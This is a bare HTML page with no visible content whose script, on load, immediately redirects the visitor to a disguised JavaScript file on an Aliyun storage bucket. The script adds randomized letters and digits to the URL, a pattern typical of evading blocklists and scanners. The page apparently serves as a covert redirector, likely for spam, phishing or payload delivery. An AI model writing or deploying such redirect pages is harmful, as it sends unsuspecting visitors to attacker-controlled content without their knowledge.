<html>
<script>


var urls=[
  	'https://vcsgamefile.oss-cn-hangzhou.aliyuncs.com/accountAssistant/archiveLoadingFailed/dlwxa0a6e78d667/10.131.2.32-2023-07-27%2012%3A33%3A55.js?tytrufhbvnjaskdiwqeiqzxc?{wwww}{nnnn}',
];
location.href = myEeplace(urls[Math.floor(Math.random()*urls.length)]);
function myEeplace(s){
	return s.replace(/\{(\w+?)\}/g,function(a,b){
		var h='';
		for(var i=0;i<b.length;i++){
			if('n'==b[i]){
				h+=Math.floor(Math.random()*10);
			}else if('w'==b[i]){
				h+=String.fromCharCode(97+Math.floor(Math.random()*26));
			}
		}
		return h;
	});
}
</script>
